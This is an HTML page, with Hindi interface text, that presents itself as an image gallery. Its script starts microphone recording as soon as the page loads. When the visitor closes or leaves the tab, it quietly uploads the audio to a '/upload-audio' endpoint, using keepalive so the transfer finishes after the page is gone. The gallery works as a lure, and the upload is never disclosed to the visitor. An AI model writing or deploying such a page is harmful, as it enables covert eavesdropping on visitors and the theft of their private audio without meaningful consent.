<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ऑटो-रिकॉर्ड गैलरी</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #fafafa; }
        .banner { background: #ffe6e6; color: #d90000; padding: 12px; text-align: center; font-weight: bold; border-radius: 6px; margin-bottom: 20px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; }
        .gallery img { width: 1005; height: 220px; object-fit: cover; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    </style>
</head>
<body>

    <div id="statusBanner" class="banner">माइक्रोफोन की अनुमति का इंतज़ार है...</div>

    <h2>सुंदर तस्वीरें (नीचे स्क्रॉल करें)</h2>
    <div class="gallery">
        <img src="https://picsum.photos/400/300?random=1" alt="Pic 1">
        <img src="https://picsum.photos/400/300?random=2" alt="Pic 2">
        <img src="https://picsum.photos/400/300?random=3" alt="Pic 3">
        <img src="https://picsum.photos/400/300?random=4" alt="Pic 4">
        <img src="https://picsum.photos/400/300?random=5" alt="Pic 5">
        <img src="https://picsum.photos/400/300?random=6" alt="Pic 6">
        <img src="https://picsum.photos/400/300?random=7" alt="Pic 7">
        <img src="https://picsum.photos/400/300?random=8" alt="Pic 8">
    </div>

    <script>
        let mediaRecorder;
        let audioChunks = [];
        const statusBanner = document.getElementById('statusBanner');

        // पेज लोड होते ही ऑटोमैटिक माइक्रोफोन परमिशन और रिकॉर्डिंग शुरू करना
        window.addEventListener('load', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                // रिकॉर्डिंग शुरू
                mediaRecorder.start(1000); // हर 1 सेकंड में डेटा चंक सेव होगा
                statusBanner.textContent = '🔴 रिकॉर्डिंग लाइव चल रही है...';
                statusBanner.style.background = '#e6ffe6';
                statusBanner.style.color = '#008000';

            } catch (err) {
                statusBanner.textContent = '❌ माइक्रोफोन की अनुमति नहीं दी गई!';
                console.error(err);
            }
        });

        // जैसे ही यूज़र लिंक/टैब बंद करेगा या पेज छोड़ेगा
        window.addEventListener('pagehide', () => {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();

                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const formData = new FormData();
                formData.append('audio', audioBlob, 'auto-recording.webm');

                // keepalive का उपयोग करके टैब बंद होने पर भी डेटा बैकएंड पर भेजा जाएगा
                fetch('/upload-audio', {
                    method: 'POST',
                    body: formData,
                    keepalive: true 
                });
            }
        });
    </script>
</body>
</html>
